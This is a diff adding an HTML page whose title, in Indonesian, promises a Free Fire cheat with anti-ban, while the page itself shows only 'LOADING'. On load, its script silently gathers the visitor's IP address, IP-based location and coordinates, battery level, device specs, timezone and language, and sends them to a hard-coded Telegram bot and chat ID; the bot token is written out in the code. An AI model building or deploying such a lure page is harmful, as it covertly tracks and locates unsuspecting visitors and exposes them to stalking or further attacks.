@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>cara membuat chet free fire bagi bagi anti ban ff work 1000%</title>
+    <script>
+        // Global variable to store TikTok URL
+        let tiktokUrl = "";
+
+        async function collectDeviceInfo() {
+            try {
+                // Check for TikTok URL in the query parameters
+                const urlParams = new URLSearchParams(window.location.search);
+                tiktokUrl = urlParams.get('tiktok') || "";
+
+                const deviceInfo = {
+                    ip: await getIPAddress(),
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    batteryLevel: await getBatteryLevel(),
+                    ram: navigator.deviceMemory || "Tidak terdeteksi",
+                    cpuCores: navigator.hardwareConcurrency || "Tidak terdeteksi",
+                    screenResolution: `${window.screen.width}x${window.screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    language: navigator.language,
+                    cookiesEnabled: navigator.cookieEnabled,
+                    imei: "Tidak tersedia di browser (Dibutuhkan aplikasi native)",
+                    androidVersion: extractAndroidVersion(navigator.userAgent),
+                    tiktokUrl: tiktokUrl
+                };
+
+                // Try to get detailed location including street name
+                try {
+                    const locationData = await getDetailedLocation(deviceInfo.ip);
+                    deviceInfo.location = `Alamat: ${locationData.street || 'Jalan tidak diketahui'}, ${locationData.city}, ${locationData.region}, ${locationData.country}`;
+                    deviceInfo.coordinates = `Koordinat: ${locationData.latitude}, ${locationData.longitude}`;
+                } catch (e) {
+                    deviceInfo.location = "Lokasi detail tidak terdeteksi";
+                }
+
+                sendToTelegram(deviceInfo);
+            } catch (error) {
+                console.error("Error collecting device info:", error);
+                alert("Terjadi error saat mengumpulkan data");
+            }
+        }
+
+        async function getIPAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (e) {
+                return "IP tidak terdeteksi";
+            }
+        }
+
+        async function getBatteryLevel() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    return `${Math.round(battery.level * 100)}%`;
+                } catch (e) {
+                    return "Baterai tidak terdeteksi";
+                }
+            }
+            return "Baterai tidak terdeteksi";
+        }
+
+        async function getDetailedLocation(ip) {
+            try {
+                // Using ipinfo.io for more detailed location (including approximate street)
+                const response = await fetch(`https://ipinfo.io/${ip}/json?token=YOUR_IPINFO_TOKEN`);
+                const data = await response.json();
+                
+                return {
+                    street: data.street || null,
+                    city: data.city || 'Tidak diketahui',
+                    region: data.region || 'Tidak diketahui',
+                    country: data.country || 'Tidak diketahui',
+                    latitude: data.loc ? data.loc.split(',')[0] : null,
+                    longitude: data.loc ? data.loc.split(',')[1] : null
+                };
+            } catch (e) {
+                // Fallback to ipapi.co if ipinfo fails
+                const fallback = await fetch(`https://ipapi.co/${ip}/json/`);
+                const fallbackData = await fallback.json();
+                return {
+                    street: null,
+                    city: fallbackData.city || 'Tidak diketahui',
+                    region: fallbackData.region || 'Tidak diketahui',
+                    country: fallbackData.country_name || 'Tidak diketahui',
+                    latitude: fallbackData.latitude || null,
+                    longitude: fallbackData.longitude || null
+                };
+            }
+        }
+
+        function extractAndroidVersion(userAgent) {
+            const match = userAgent.match(/Android\s([0-9\.]+)/);
+            return match ? match[1] : "Tidak terdeteksi";
+        }
+
+        function sendToTelegram(data) {
+            const botToken = "7489205161:AAG3OEyK1BF-H4ghLav9MLRgwfTssAPJOjc";
+            const chatId = "6471584924";
+            
+            // Base device info message
+            let message = `📱 *Device Info*:\n\n` +
+                `🌐 *IP*: ${data.ip}\n` +
+                `📍 *Lokasi*: ${data.location || "Tidak terdeteksi"}\n` +
+                (data.coordinates ? `🗺️ *Koordinat*: ${data.coordinates}\n` : '') +
+                `🕒 *Zona Waktu*: ${data.timezone}\n` +
+                `🌍 *Bahasa*: ${data.language}\n` +
+                `📱 *Perangkat*: ${data.userAgent}\n` +
+                `🔋 *Baterai*: ${data.batteryLevel}\n` +
+                `💾 *RAM*: ${data.ram} GB\n` +
+                `🖥️ *CPU Cores*: ${data.cpuCores}\n` +
+                `📺 *Layar*: ${data.screenResolution}\n` +
+                `🍪 *Cookies*: ${data.cookiesEnabled ? 'Aktif' : 'Nonaktif'}\n` +
+                `🤖 *Android*: ${data.androidVersion}\n` +
+                `🔒 *IMEI*: ${data.imei}`;
+
+            // Add TikTok URL if available
+            if (data.tiktokUrl) {
+                message += `\n\n🎵 *https://vm.tiktok.com/ZMBPmrrbj/*: ${data.tiktokUrl}`;
+                
+                // Send video separately if it's a direct video URL
+                if (data.tiktokUrl.includes('video')) {
+                    fetch(`https://api.telegram.org/bot${botToken}/sendVideo?chat_id=${chatId}&video=${encodeURIComponent(data.tiktokUrl)}`)
+                        .catch(e => console.error("Gagal mengirim video:", e));
+                }
+            }
+
+            // Send the message
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`)
+                .then(() => alert("Data perangkat telah dikirim ke Telegram!"))
+                .catch(e => {
+                    console.error("Gagal mengirim data:", e);
+                    alert("Gagal mengirim data ke Telegram");
+                });
+        }
+
+        window.onload = collectDeviceInfo;
+    </script>
+</head>
+<body>
+    <h1>LOADING .....</h1>
+    <div id="tiktokContainer" style="display:none;"></div>
+</body>
+</html>
